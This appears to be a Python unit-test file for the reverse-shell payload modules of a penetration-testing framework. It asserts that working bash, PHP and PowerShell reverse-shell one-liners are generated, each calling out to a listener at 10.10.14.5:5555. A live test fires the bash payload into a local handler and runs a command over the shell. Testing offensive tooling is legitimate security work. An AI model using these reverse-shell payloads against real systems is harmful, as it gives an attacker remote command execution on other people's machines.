"""Tests for the reverse-shell payload modules.

Unit tests for generation; a live end-to-end for the bash payload against
a jobbed handler (bash exists on any Linux box, so we can prove the whole
loop: generate -> fire -> session -> shell).

Run: python3 -m unittest discover -s tests
"""

import contextlib
import io
import shutil
import socket
import subprocess
import sys
import time
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from core import output  # noqa: E402
from core.console import FrameworkConsole  # noqa: E402
from core.registry import ModuleRegistry  # noqa: E402
from core.store import Store  # noqa: E402

output.color_enabled = False


def make_console():
    registry = ModuleRegistry(ROOT / "modules")
    registry.load()
    return FrameworkConsole(registry, Store(":memory:"))


def console_out(console, *commands):
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        for command in commands:
            console.onecmd(command)
    return buf.getvalue()


class TestPayloadGeneration(unittest.TestCase):
    def setUp(self):
        self.console = make_console()

    def tearDown(self):
        self.console.store.close()

    def _generate(self, path):
        return console_out(
            self.console, f"use {path}", "set LHOST 10.10.14.5",
            "set LPORT 5555", "generate",
        )

    def test_bash(self):
        out = self._generate("payloads/bash_reverse_tcp")
        self.assertIn("bash -i >& /dev/tcp/10.10.14.5/5555 0>&1", out)

    def test_php(self):
        out = self._generate("payloads/php_reverse_tcp")
        self.assertIn('fsockopen("10.10.14.5",5555)', out)
        self.assertIn("/bin/sh -i <&3 >&3 2>&3", out)

    def test_powershell(self):
        out = self._generate("payloads/powershell_reverse_tcp")
        self.assertIn("TCPClient('10.10.14.5',5555)", out)
        self.assertIn("powershell -nop -c", out)
        # braces must survive .format: $bytes init and while loop intact
        self.assertIn("%{0}", out)
        self.assertIn("$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;", out)


def free_port():
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def wait_for(predicate, timeout=10.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        if predicate():
            return True
        time.sleep(0.05)
    return False


@unittest.skipUnless(shutil.which("bash"), "needs bash")
class TestBashPayloadVsHandler(unittest.TestCase):
    def setUp(self):
        self.console = make_console()
        self.port = free_port()

    def tearDown(self):
        self.console.store.close()

    def test_full_loop(self):
        console_out(
            self.console,
            "use exploits/multi/handler",
            "set LHOST 127.0.0.1",
            f"set LPORT {self.port}",
            "run -j",
        )
        job = self.console.jobs.all()[0]
        self.assertTrue(wait_for(lambda: "Listening" in job.output_text()))

        out = console_out(
            self.console,
            "use payloads/bash_reverse_tcp",
            "set LHOST 127.0.0.1",
            f"set LPORT {self.port}",
            "generate",
        )
        payload = next(
            line for line in out.splitlines() if line.startswith("bash -i")
        )
        proc = subprocess.Popen(
            payload, shell=True,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        try:
            self.assertTrue(
                wait_for(lambda: len(self.console.sessions.all()) == 1),
                "bash payload never connected",
            )
            session = self.console.sessions.get(1)
            session.sock.settimeout(10)
            session.send("echo $((6*7))\n")
            data = b""
            deadline = time.time() + 10
            while b"42" not in data and time.time() < deadline:
                try:
                    data += session.recv(4096)
                except socket.timeout:
                    break
            self.assertIn(b"42", data)
        finally:
            proc.kill()
            console_out(self.console, "back", f"jobs -k {job.id}")


if __name__ == "__main__":
    unittest.main()
